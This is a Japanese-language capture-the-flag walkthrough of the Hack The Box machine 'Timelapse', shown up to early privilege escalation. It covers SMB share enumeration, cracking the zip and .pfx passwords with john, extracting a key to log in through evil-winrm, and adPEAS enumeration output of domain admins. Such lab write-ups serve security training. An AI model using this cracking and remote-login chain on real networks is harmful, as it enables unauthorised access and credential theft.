![](https://i.imgur.com/MFFHLmO.png)


- URL : https://app.hackthebox.com/machines/Timelapse
- #easy
- OS : #Windows
- Hack Date: 2025-08-09,13:11 ~ User : 14:10,

# Enumeration
Principle
1. **目に見えるものだけがすべてではない。** あらゆる視点を考慮しろ
2. 見えていることと、見えていないことを区別しろ
3. **常に情報を得る手段は存在する。** 対象をしっかり理解しろ

## Nmap
ドメイン名 
- timelapse.htb0
- dc01.timelapse.htb

| ポート       | サービス             | バージョン                                                                                            | その他        |
| --------- | ---------------- | ------------------------------------------------------------------------------------------------ | ---------- |
| 53/tcp    | **DNS**          | Simple DNS Plus                                                                                  |            |
| 88/tcp    | **Kerberos**     | Microsoft Windows Kerberos (server time: 2025-08-09 12:15:53Z)                                   |            |
| 135/tcp   | msrpc            | Microsoft Windows RPC                                                                            |            |
| 139/tcp   | netbios-ssn      | Microsoft Windows netbios-ssn                                                                    |            |
| 389/tcp   | ldap             | Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) |            |
| 445/tcp   | **SMB**          | 不明                                                                                               |            |
| 464/tcp   | kpasswd5         | 不明                                                                                               |            |
| 593/tcp   | ncacn_http       | Microsoft Windows RPC over HTTP 1.0                                                              |            |
| 636/tcp   | **ldaps**        | 不明                                                                                               |            |
| 3268/tcp  | **ldap**         | Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name) |            |
| 3269/tcp  | globalcatLDAPssl | 不明                                                                                               |            |
| 5986/tcp  | **https**        | Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)                                                          | SSL証明書情報あり |
| 9389/tcp  | mc-nmf           | .NET Message Framing                                                                             |            |
| 49667/tcp | msrpc            | Microsoft Windows RPC                                                                            |            |
| 49673/tcp | ncacn_http       | Microsoft Windows RPC over HTTP 1.0                                                              |            |
| 49674/tcp | msrpc            | Microsoft Windows RPC                                                                            |            |
| 49692/tcp | msrpc            | Microsoft Windows RPC                                                                            |            |
| 61936/tcp | msrpc            | Microsoft Windows RPC                                                                            |            |

```bash
PORT      STATE SERVICE           REASON          VERSION
53/tcp    open  domain            syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec      syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-08-09 12:15:53Z)
135/tcp   open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn       syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?     syn-ack ttl 127
464/tcp   open  kpasswd5?         syn-ack ttl 127
593/tcp   open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?          syn-ack ttl 127
3268/tcp  open  ldap              syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl? syn-ack ttl 127
5986/tcp  open  ssl/http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
| ssl-cert: Subject: commonName=dc01.timelapse.htb
| Issuer: commonName=dc01.timelapse.htb
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-10-25T14:05:29
| Not valid after:  2022-10-25T14:25:29
| MD5:   e233:a199:4504:0859:013f:b9c5:e4f6:91c3
| SHA-1: 5861:acf7:76b8:703f:d01e:e25d:fc7c:9952:a447:7652
| -----BEGIN CERTIFICATE-----
|_-----END CERTIFICATE-----
|_ssl-date: 2025-08-09T12:17:28+00:00; +7h59m58s from scanner time.
|_http-server-header: Microsoft-HTTPAPI/2.0
| tls-alpn: 
|_  http/1.1
|_http-title: Not Found
9389/tcp  open  mc-nmf            syn-ack ttl 127 .NET Message Framing
49667/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  ncacn_http        syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49674/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
49692/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
61936/tcp open  msrpc             syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.95%E=4%D=8/8%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=6896CBDB%P=aarch64-unknown-linux-gnu)
SEQ(SP=100%GCD=1%ISR=10E%TI=I%II=I%SS=S%TS=U)
SEQ(SP=107%GCD=1%ISR=10B%TI=I%II=I%SS=S%TS=U)
OPS(O1=M552NW8NNS%O2=M552NW8NNS%O3=M552NW8%O4=M552NW8NNS%O5=M552NW8NNS%O6=M552NNS)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FF70)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=263 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-08-09T12:16:49
|_  start_date: N/A
|_clock-skew: mean: 7h59m58s, deviation: 0s, median: 7h59m57s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 38738/tcp): CLEAN (Timeout)
|   Check 2 (port 49914/tcp): CLEAN (Timeout)
|   Check 3 (port 43455/udp): CLEAN (Timeout)
|   Check 4 (port 41655/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using port 135/tcp)
HOP RTT      ADDRESS
1   94.00 ms 10.10.14.1
2   94.02 ms 10.129.227.113


```

## SMB
- 匿名ログインができるか
- 匿名ログインができてSharesフォルダが気になる
```sh
┌──(kali㉿kali)-[~/Desktop/HTB/machine/Timelapse]
└─$ smbclient -N -L //$Target_IP

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        Shares          Disk      
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.129.227.113 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

Sharesフォルダの中には、DevとHelpDeskの二つのフォルダがある
```bash
──(kali㉿kali)-[~/Desktop/HTB/machine/Timelapse]
└─$ smbclient -N //$Target_IP/Shares   
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Mon Oct 25 08:39:15 2021
  ..                                  D        0  Mon Oct 25 08:39:15 2021
  Dev                                 D        0  Mon Oct 25 12:40:06 2021
  HelpDesk                            D        0  Mon Oct 25 08:48:42 2021

```

Devの中には winrm_backup.zipが入っているので取得
```
                6367231 blocks of size 4096. 1290117 blocks available
smb: \> cd Dev
smb: \Dev\> ls
  .                                   D        0  Mon Oct 25 12:40:06 2021
  ..                                  D        0  Mon Oct 25 12:40:06 2021
  winrm_backup.zip                    A     2611  Mon Oct 25 08:46:42 2021

                6367231 blocks of size 4096. 1287058 blocks available
smb: \Dev\> get winrm_backup.zip
getting file \Dev\winrm_backup.zip of size 2611 as winrm_backup.zip (5.9 KiloBytes/sec) (average 5.9 KiloBytes/sec)
```

HelpDeskの中にはLAPSに関わる様々な文書が置いてあるので全て取得
```
smb: \> cd HelpDesk
smb: \HelpDesk\> ls
  .                                   D        0  Mon Oct 25 08:48:42 2021
  ..                                  D        0  Mon Oct 25 08:48:42 2021
  LAPS.x64.msi                        A  1118208  Mon Oct 25 07:57:50 2021
  LAPS_Datasheet.docx                 A   104422  Mon Oct 25 07:57:46 2021
  LAPS_OperationsGuide.docx           A   641378  Mon Oct 25 07:57:40 2021
  LAPS_TechnicalSpecification.docx      A    72683  Mon Oct 25 07:57:44 2021

                6367231 blocks of size 4096. 1279179 blocks available
smb: \HelpDesk\> get LAPS.x64.msi
getting file \HelpDesk\LAPS.x64.msi of size 1118208 as LAPS.x64.msi (131.2 KiloBytes/sec) (average 125.0 KiloBytes/sec)
smb: \HelpDesk\> get LAPS_Datasheet.docx
getting file \HelpDesk\LAPS_Datasheet.docx of size 104422 as LAPS_Datasheet.docx (121.0 KiloBytes/sec) (average 124.6 KiloBytes/sec)
smb: \HelpDesk\> get LAPS_OperationsGuide.docx
getting file \HelpDesk\LAPS_OperationsGuide.docx of size 641378 as LAPS_OperationsGuide.docx (125.5 KiloBytes/sec) (average 124.9 KiloBytes/sec)
smb: \HelpDesk\> get LAPS_TechnicalSpecification.docx
getting file \HelpDesk\LAPS_TechnicalSpecification.docx of size 72683 as LAPS_TechnicalSpecification.docx (83.3 KiloBytes/sec) (average 122.6 KiloBytes/sec)

```

書き込み権限はない様子
```sh
smb: \HelpDesk\> !touch aaa.txt
smb: \HelpDesk\> put aaa.txt
NT_STATUS_ACCESS_DENIED opening remote file \HelpDesk\aaa.txt
smb: \HelpDesk\> cd ../Dev
smb: \Dev\> put aaa.txt
NT_STATUS_ACCESS_DENIED opening remote file \Dev\aaa.txt
```

それぞれの中身を確認する
# Foothold

winrm_backup.zipはパスワードでロックされている
ちなみに、.pfxとは
- `.pfx` は PKCS#12 形式の証明書コンテナ
- だいたい クライアント/サーバ証明書＋秘密鍵＋中間CA がひとまとめ、パスワード保護されてい
```bash
┌──(kali㉿kali)-[~/…/HTB/machine/Timelapse/SMB]
└─$ unzip winrm_backup.zip             
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 

```


helpdeskに入っている文章は、Microsoftのもので特にパスワードとかは書いてなさそう
なので、.zipのパスワードをrockyou.txtでクラックを試みる
パスワード付きzipをjohnが解析する形にする
```sh
┌──(kali㉿kali)-[~/…/HTB/machine/Timelapse/SMB]
└─$ zip2john winrm_backup.zip > winrm_backup_zip.hash
ver 2.0 efh 5455 efh 7875 winrm_backup.zip/legacyy_dev_auth.pfx PKZIP Encr: TS_chk, cmplen=2405, decmplen=2555, crc=12EC5683 ts=72AA cs=72aa type=8

```

クラックする
```
┌──(kali㉿kali)-[~/…/HTB/machine/Timelapse/SMB]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt *zip.hash
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx)     
1g 0:00:00:00 DONE (2025-08-08 21:45) 2.631g/s 9135Kp/s 9135Kc/s 9135KC/s sur13ce..superrbd
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

クラックできた
.zipのパスワードは、「supremelegacy」であることがわかった
このパスワードで解凍できた
```sh
┌──(kali㉿kali)-[~/…/HTB/machine/Timelapse/SMB]
└─$ unzip winrm_backup.zip             
Archive:  winrm_backup.zip
[winrm_backup.zip] legacyy_dev_auth.pfx password: 
password incorrect--reenter: 
  inflating: legacyy_dev_auth.pfx 
```

.PFX ファイルから証明書と秘密鍵を抽出する
- 以下の記事に従って、行う
	- https://netshopisp.medium.com/how-to-extract-certificates-and-private-key-from-pfx-file-729067cbdaa7
パスワードを要求される
- 「supremelegacy」を入れると間違っていると出る
```sh
┌──(kali㉿kali)-[~/…/HTB/machine/Timelapse/SMB]
└─$ sudo openssl pkcs12 -in legacyy_dev_auth.pfx -out legacyy_dev_auth.pem -nodes 
[sudo] password for kali: 
Enter Import Password:
Mac verify error: invalid password?

```

なので、ここでもクラックして、中身を取り出すことを試みる
参考記事によると、pfx2john.pyでjohnの形式にできるらしい
- 参考記事
	- https://cicada-8.medium.com/adcs-so-u-got-certificate-now-ive-got-nine-ways-to-abuse-it-861081cff082
```sh
pfx2john legacyy_dev_auth.pfx > legacyy_dev_auth_pfx.hash
```

クラックする
```sh
┌──(kali㉿kali)-[~/…/HTB/machine/Timelapse/SMB]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt legacyy_dev_auth_pfx.hash
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 128/128 ASIMD 4x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 6 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:13 4.95% (ETA: 22:02:21) 0g/s 62337p/s 62337c/s 62337C/s reynaldo8..rawlings125
thuglegacy       (legacyy_dev_auth.pfx)     
1g 0:00:00:51 DONE (2025-08-08 21:58) 0.01929g/s 62340p/s 62340c/s 62340C/s thurgkub..thsco04
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```


クラックが成功し、パスワードは、「thuglegacy」であることがわかった
参考記事によると、抽出したファイルで、winrmに接続できるらしいので、接続するための鍵ファイルを抽出する
```sh
┌──(kali㉿kali)-[~/…/HTB/machine/Timelapse/SMB]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -clcerts -nokeys -out cert.crt -nodes
Enter Import Password:
Enter Import Password:
```

接続できた
user.txtを取得できた
```sh
┌──(kali㉿kali)-[~/…/HTB/machine/Timelapse/SMB]
└─$ evil-winrm -S -k ./key.pem -c ./cert.crt -i 10.129.227.113
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Warning: SSL enabled
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> whoami
timelapse\legacyy
*Evil-WinRM* PS C:\Users\legacyy\Documents> ls
*Evil-WinRM* PS C:\Users\legacyy\Documents> cd ../Desktop
*Evil-WinRM* PS C:\Users\legacyy\Desktop> ls


    Directory: C:\Users\legacyy\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         8/9/2025   5:05 AM             34 user.txt


*Evil-WinRM* PS C:\Users\legacyy\Desktop> type user.txt
```


# Privilege Escalation
気になっていたadPEASを試してみる
ホスト側
```bash
wget https://github.com/61106960/adPEAS/raw/refs/heads/main/adPEAS.ps1
```

winrmでuploadして転送して使用する
```bash
*Evil-WinRM* PS C:\Users\legacyy\Desktop> Import-Module .\adPEAS.ps1
*Evil-WinRM* PS C:\Users\legacyy\Desktop> Invoke-adPEAS

               _ _____  ______           _____                                         
              | |  __ \|  ____|   /\    / ____|                                        
      ____  __| | |__) | |__     /  \  | (___                                          
     / _  |/ _  |  ___/|  __|   / /\ \  \___ \                                         
    | (_| | (_| | |    | |____ / ____ \ ____) |                                        
     \__,_|\__,_|_|    |______/_/    \_\_____/                                         
                                            Version 0.8.27                             
                                                                                       
    Active Directory Enumeration
    by @61106960

    Legend
        [?] Searching for juicy information
        [!] Found a vulnerability which may can be exploited in some way
        [+] Found some interesting information for further investigation
        [*] Some kind of note
        [#] Some kind of secure configuration


[?] +++++ Searching for Juicy Active Directory Information +++++                       

[?] +++++ Checking General Domain Information +++++                                    
[+] Found general Active Directory domain information for domain 'timelapse.htb':
Domain Name:                            timelapse.htb
Domain SID:                             S-1-5-21-671920749-559770252-3318990721
Domain Functional Level:                Windows 2016
Forest Name:                            timelapse.htb
Forest Children:                        No Subdomain[s] available
Domain Controller:                      dc01.timelapse.htb

[?] +++++ Checking Domain Policies +++++                                               
[+] Found password policy of domain 'timelapse.htb':
Minimum Password Age:                   1 days
Maximum Password Age:                   42 days
[+] Minimum Password Length:            7 character
Password Complexity:                    Enabled
[!] Lockout Account:                    Disabled
Reversible Encryption:                  Disabled
[+] Found Kerberos policy of domain 'timelapse.htb':
Maximum Age of TGT:                     10 hours
Maximum Age of TGS:                     600 minutes
Maximum Clock Time Difference:          5 minutes
Krbtgt Password Last Set:               10/23/2021 11:40:55

[?] +++++ Checking Domain Controller, Sites and Subnets +++++                          
[+] Found domain controller of domain 'timelapse.htb':
DC Host Name:                           dc01.timelapse.htb
DC Roles:                               SchemaRole,NamingRole,PdcRole,RidRole,InfrastructureRole                                                                              
DC IP Address:                          fe80::cda9:db95:be54:1688%13
Site Name:                              Default-First-Site-Name
                                                                                       

[?] +++++ Checking Forest and Domain Trusts +++++                                      

[?] +++++ Checking Juicy Permissions +++++                                             

[?] +++++ Checking NetLogon Access Rights +++++                                        

[?] +++++ Checking Add-Computer Permissions +++++                                      
[+] Filtering found identities that can add a computer object to domain 'timelapse.htb':                                                                                      
[!] The Machine Account Quota is currently set to 10
[!] Every member of group 'Authenticated Users' can add a computer to domain 'timelapse.htb'                                                                                  
                                                                                       
distinguishedName:                      CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=timelapse,DC=htb                                                                          
objectSid:                              S-1-5-11
memberOf:                               CN=Pre-Windows 2000 Compatible Access,CN=Builtin,DC=timelapse,DC=htb                                                                  
                                        CN=Users,CN=Builtin,DC=timelapse,DC=htb        
 

[?] +++++ Checking DCSync Permissions +++++                                            
[+] Filtering found identities that can perform DCSync in domain 'timelapse.htb':
[+] The identity 'thecybergeek' is a non-default account and can DCSync a domain controller                                                                                   
sAMAccountName:                         thecybergeek
userPrincipalName:                      thecybergeek@timelapse.htb
distinguishedName:                      CN=TheCyberGeek,OU=Admins,OU=Staff,DC=timelapse,DC=htb                                                                                
objectSid:                              S-1-5-21-671920749-559770252-3318990721-1601
memberOf:                               CN=Domain Admins,CN=Users,DC=timelapse,DC=htb
pwdLastSet:                             10/23/2021 12:16:26
userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
[+] admincount:                         This identity is or was member of a high privileged admin group                                                                       
 
[+] The identity 'payl0ad' is a non-default account and can DCSync a domain controller
sAMAccountName:                         payl0ad
userPrincipalName:                      payl0ad@timelapse.htb
distinguishedName:                      CN=Payl0ad,OU=Admins,OU=Staff,DC=timelapse,DC=htb                                                                                     
objectSid:                              S-1-5-21-671920749-559770252-3318990721-1602
memberOf:                               CN=Domain Admins,CN=Users,DC=timelapse,DC=htb
pwdLastSet:                             10/23/2021 12:16:44
userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
[+] admincount:                         This identity is or was member of a high privileged admin group                                                                       
 
[+] The identity 'TRX' is a non-default account and can DCSync a domain controller
sAMAccountName:                         TRX
userPrincipalName:                      TRX@timelapse.htb
distinguishedName:                      CN=TRX,OU=Admins,OU=Staff,DC=timelapse,DC=htb
objectSid:                              S-1-5-21-671920749-559770252-3318990721-5101
memberOf:                               CN=Domain Admins,CN=Users,DC=timelapse,DC=htb
pwdLastSet:                             02/23/2022 17:43:45
lastLogonTimestamp:                     08/09/2025 05:04:56
userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
[+] admincount:                         This identity is or was member of a high privileged admin group                                                                       
 

[?] +++++ Checking LAPS Permissions +++++                                              
[+] Filtering found identities that can read LAPS attribute in domain 'timelapse.htb':

[?] +++++ Searching for GPO local group membership Information +++++                   

[?] +++++ Searching for Active Directory Certificate Services Information +++++        

[?] +++++ Searching for Vulnerable Certificate Templates +++++                         

[?] +++++ Searching for Credentials Exposure +++++                                     

[?] +++++ Searching for ASREProastable User +++++                                      

[?] +++++ Searching for Kerberoastable User +++++                                      

[?] +++++ Searching for User with 'Linux/Unix Password' attribute +++++                

[?] +++++ Searching for Computer with enabled and readable Microsoft LAPS legacy attribute +++++                                                                              

[?] +++++ Searching for Computer with enabled and readable Windows LAPS native attribute +++++                                                                                

[?] +++++ Searching for Group Managed Service Account (gMSA) +++++                     

[?] +++++ Searching for Credentials in Group Policy Files +++++                        

[?] +++++ Searching for Sensitive Information in SYSVOL/NETLOGON Share +++++           

[?] +++++ Searching for Delegation Issues +++++                                        

[?] +++++ Searching for Computer with Unconstrained Delegation Rights +++++            

[?] +++++ Searching for Computer with Constrained Delegation Rights +++++              

[?] +++++ Searching for Computer with Resource-Based Constrained Delegation Rights +++++                                                                                      

[?] +++++ Searching for User with Unconstrained Delegation Rights +++++                

[?] +++++ Searching for User with Constrained Delegation Rights +++++                  

[?] +++++ Searching for User with Resource-Based Constrained Delegation Rights +++++   

[?] +++++ Starting Account Enumeration +++++                                           

[?] +++++ Searching for Azure AD Connect +++++                                         

[?] +++++ Searching for Users in High Privileged Groups +++++                          
[+] Found members in group 'BUILTIN\Administrators':
GroupName:                              Domain Admins
distinguishedName:                      CN=Domain Admins,CN=Users,DC=timelapse,DC=htb
objectSid:                              S-1-5-21-671920749-559770252-3318990721-512
[+] description:                        Designated administrators of the domain
 
GroupName:                              Enterprise Admins
distinguishedName:                      CN=Enterprise Admins,CN=Users,DC=timelapse,DC=htb                                                                                     
objectSid:                              S-1-5-21-671920749-559770252-3318990721-519
[+] description:                        Designated administrators of the enterprise
 
sAMAccountName:                         thecybergeek
userPrincipalName:                      thecybergeek@timelapse.htb
distinguishedName:                      CN=TheCyberGeek,OU=Admins,OU=Staff,DC=timelapse,DC=htb                                                                                
objectSid:                              S-1-5-21-671920749-559770252-3318990721-1601
memberOf:                               CN=Domain Admins,CN=Users,DC=timelapse,DC=htb
pwdLastSet:                             10/23/2021 12:16:26
userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
[+] admincount:                         This identity is or was member of a high privileged admin group                                                                       
 
sAMAccountName:                         TRX
userPrincipalName:                      TRX@timelapse.htb
distinguishedName:                      CN=TRX,OU=Admins,OU=Staff,DC=timelapse,DC=htb
objectSid:                              S-1-5-21-671920749-559770252-3318990721-5101
memberOf:                               CN=Domain Admins,CN=Users,DC=timelapse,DC=htb
pwdLastSet:                             02/23/2022 17:43:45
lastLogonTimestamp:                     08/09/2025 05:04:56
userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
[+] admincount:                         This identity is or was member of a high privileged admin group                                                                       
 
sAMAccountName:                         Administrator
distinguishedName:                      CN=Administrator,CN=Users,DC=timelapse,DC=htb
objectSid:                              S-1-5-21-671920749-559770252-3318990721-500
memberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=timelapse,DC=htb                                                                           
                                        CN=Domain Admins,CN=Users,DC=timelapse,DC=htb  
                                        CN=Enterprise Admins,CN=Users,DC=timelapse,DC=htb                                                                                     
                                        CN=Schema Admins,CN=Users,DC=timelapse,DC=htb  
                                        CN=Administrators,CN=Builtin,DC=timelapse,DC=htb                                                                                      
[+] description:                        Built-in account for administering the computer/domain                                                                                
pwdLastSet:                             08/09/2025 05:04:57
lastLogonTimestamp:                     02/23/2022 17:18:22
userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
[+] admincount:                         This identity is or was member of a high privileged admin group                                                                       
 
sAMAccountName:                         payl0ad
userPrincipalName:                      payl0ad@timelapse.htb
distinguishedName:                      CN=Payl0ad,OU=Admins,OU=Staff,DC=timelapse,DC=htb                                                                                     
objectSid:                              S-1-5-21-671920749-559770252-3318990721-1602
memberOf:                               CN=Domain Admins,CN=Users,DC=timelapse,DC=htb
pwdLastSet:                             10/23/2021 12:16:44
userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
[+] admincount:                         This identity is or was member of a high privileged admin group                                                                       
 
[+] Found members in group 'TIMELAPSE\Domain Admins':
sAMAccountName:                         thecybergeek
userPrincipalName:                      thecybergeek@timelapse.htb
distinguishedName:                      CN=TheCyberGeek,OU=Admins,OU=Staff,DC=timelapse,DC=htb                                                                                
objectSid:                              S-1-5-21-671920749-559770252-3318990721-1601
memberOf:                               CN=Domain Admins,CN=Users,DC=timelapse,DC=htb
pwdLastSet:                             10/23/2021 12:16:26
userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
[+] admincount:                         This identity is or was member of a high privileged admin group                                                                       
 
sAMAccountName:                         TRX
userPrincipalName:                      TRX@timelapse.htb
distinguishedName:                      CN=TRX,OU=Admins,OU=Staff,DC=timelapse,DC=htb
objectSid:                              S-1-5-21-671920749-559770252-3318990721-5101
memberOf:                               CN=Domain Admins,CN=Users,DC=timelapse,DC=htb
pwdLastSet:                             02/23/2022 17:43:45
lastLogonTimestamp:                     08/09/2025 05:04:56
userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
[+] admincount:                         This identity is or was member of a high privileged admin group                                                                       
 
sAMAccountName:                         Administrator
distinguishedName:                      CN=Administrator,CN=Users,DC=timelapse,DC=htb
objectSid:                              S-1-5-21-671920749-559770252-3318990721-500
memberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=timelapse,DC=htb                                                                           
                                        CN=Domain Admins,CN=Users,DC=timelapse,DC=htb  
                                        CN=Enterprise Admins,CN=Users,DC=timelapse,DC=htb                                                                                     
                                        CN=Schema Admins,CN=Users,DC=timelapse,DC=htb  
                                        CN=Administrators,CN=Builtin,DC=timelapse,DC=htb                                                                                      
[+] description:                        Built-in account for administering the computer/domain                                                                                
pwdLastSet:                             08/09/2025 05:04:57
lastLogonTimestamp:                     02/23/2022 17:18:22
userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
[+] admincount:                         This identity is or was member of a high privileged admin group                                                                       
 
sAMAccountName:                         payl0ad
userPrincipalName:                      payl0ad@timelapse.htb
distinguishedName:                      CN=Payl0ad,OU=Admins,OU=Staff,DC=timelapse,DC=htb                                                                                     
objectSid:                              S-1-5-21-671920749-559770252-3318990721-1602
memberOf:                               CN=Domain Admins,CN=Users,DC=timelapse,DC=htb
pwdLastSet:                             10/23/2021 12:16:44
userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
[+] admincount:                         This identity is or was member of a high privileged admin group                                                                       
 
[+] Found members in group 'TIMELAPSE\Enterprise Admins':
sAMAccountName:                         Administrator
distinguishedName:                      CN=Administrator,CN=Users,DC=timelapse,DC=htb
objectSid:                              S-1-5-21-671920749-559770252-3318990721-500
memberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=timelapse,DC=htb                                                                           
                                        CN=Domain Admins,CN=Users,DC=timelapse,DC=htb  
                                        CN=Enterprise Admins,CN=Users,DC=timelapse,DC=htb                                                                                     
                                        CN=Schema Admins,CN=Users,DC=timelapse,DC=htb  
                                        CN=Administrators,CN=Builtin,DC=timelapse,DC=htb                                                                                      
[+] description:                        Built-in account for administering the computer/domain                                                                                
pwdLastSet:                             08/09/2025 05:04:57
lastLogonTimestamp:                     02/23/2022 17:18:22
userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
[+] admincount:                         This identity is or was member of a high privileged admin group                                                                       
 
[+] Found members in group 'TIMELAPSE\Group Policy Creator Owners':
sAMAccountName:                         Administrator
distinguishedName:                      CN=Administrator,CN=Users,DC=timelapse,DC=htb
objectSid:                              S-1-5-21-671920749-559770252-3318990721-500
memberOf:                               CN=Group Policy Creator Owners,CN=Users,DC=timelapse,DC=htb                                                                           
                                        CN=Domain Admins,CN=Users,DC=timelapse,DC=htb  
                                        CN=Enterprise Admins,CN=Users,DC=timelapse,DC=htb                                                                                     
                                        CN=Schema Admins,CN=Users,DC=timelapse,DC=htb  
                                        CN=Administrators,CN=Builtin,DC=timelapse,DC=htb                                                                                      
[+] description:                        Built-in account for administering the computer/domain                                                                                
pwdLastSet:                             08/09/2025 05:04:57
lastLogonTimestamp:                     02/23/2022 17:18:22
userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
[+] admincount:                         This identity is or was member of a high privileged admin group                                                                       
 
[+] Found members in group 'BUILTIN\Remote Management Users':
sAMAccountName:                         svc_deploy
userPrincipalName:                      svc_deploy@timelapse.htb
distinguishedName:                      CN=svc_deploy,CN=Users,DC=timelapse,DC=htb
objectSid:                              S-1-5-21-671920749-559770252-3318990721-3103
memberOf:                               CN=LAPS_Readers,OU=Groups,OU=Staff,DC=timelapse,DC=htb                                                                                
                                        CN=Remote Management Users,CN=Builtin,DC=timelapse,DC=htb                                                                             
pwdLastSet:                             10/25/2021 12:12:37
lastLogonTimestamp:                     02/23/2022 17:11:38
userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
 
sAMAccountName:                         legacyy
userPrincipalName:                      legacyy@timelapse.htb
distinguishedName:                      CN=Legacyy,OU=Dev,OU=Staff,DC=timelapse,DC=htb
objectSid:                              S-1-5-21-671920749-559770252-3318990721-1603
memberOf:                               CN=Development,OU=Groups,OU=Staff,DC=timelapse,DC=htb                                                                                 
                                        CN=Remote Management Users,CN=Builtin,DC=timelapse,DC=htb                                                                             
pwdLastSet:                             10/23/2021 12:17:10
lastLogonTimestamp:                     08/09/2025 06:08:37
userAccountControl:                     NORMAL_ACCOUNT, DONT_EXPIRE_PASSWORD
[+] admincount:                         This identity is or was member of a high privileged admin group                                                                       
 

